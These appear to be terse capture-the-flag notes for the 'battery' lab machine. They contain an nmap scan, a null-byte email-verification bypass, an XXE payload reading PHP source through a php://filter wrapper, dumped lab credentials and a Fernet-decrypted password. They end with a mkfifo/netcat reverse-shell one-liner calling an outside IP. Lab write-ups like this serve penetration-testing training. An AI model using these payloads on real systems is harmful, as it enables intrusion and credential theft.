# Introduction

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx battery.thm
```

# Enumeration

we do a nmap with some options :\
\
-T4 is for have more threads to accelerate the scan\
-p- is to scan all the ports\
-sV is to scan the version\
\
we run the scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -p- -sV battery.thm
```

we got these open ports
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

we found a report binary

support@bank.a
contact@bank.a
cyber@bank.a
admins@bank.a
sam@bank.a
admin0@bank.a
super_user@bank.a
admin@bank.a
control_admin@bank.a
it_admin@bank.a


check vhost : nothing
check feroxbuster in /ie/ directory
check feroxbuster on admin page with PHPSESSID

we can create an account with the admin@bank.a by settings a null character at the end so the verification of the email is corrupted
admin@bank.a%00

so now we can access the admin page

$dbh = new PDO('mysql:host=127.0.0.1;dbname=details', 'root', 'idkpass');

we found in acc.php the creds : cyber:super#secure&password!

to get acc.php content, we use php filter base64 encode and XXE at the same time
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/acc.php" > ]><root><name>20</name><search>&test;</search></root>


```
mysql> select * from users;
+--------------+--------------------+-----+--------+-----------+
| username     | password           | cno | amount | bank_name |
+--------------+--------------------+-----+--------+-----------+
| cyber        | cyber              |  14 |      0 | ABC       |
| admin@bank.a | I_know_my_password |  15 |      0 | ABC       |
| admin        | pass               |  17 |      0 | ABC       |
| check        | check              |  19 |      0 | ABC       |
| admin@bank.a | password           |  20 |      0 | ABC       |
+--------------+--------------------+-----+--------+-----------+
5 rows in set (0.00 sec)
```


3.13.0-32-generic

/etc/ld.so.preload is writable

/usr/bin/mysqladmin -u root -h ubuntu password 'new-password'
Nov 11 00:43:45 ubuntu mysqld_safe[2800]: /usr/bin/mysqladmin -u root password 'new-password'


encrypted_text:gAAAAABfs33Qms9CotZIEBMg76eOlwOiKU8LD_mX2F346WXXBVIlXWvWGfreAX4kU5hjGXf0PiwtP0cmOm5JSUI7zl03V1JKlA==

key:7OEIooZqOpT7vOh9ax8arbBeB8e243Pr8K4IVWBStgA=


we see the file is fernet that is a encryption / decryption known symetric hash algorigthm
we use this website and can get the password : https://asecuritysite.com/tokens/ferdecode
idkpassyash


rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.72.209 6667 >/tmp/f
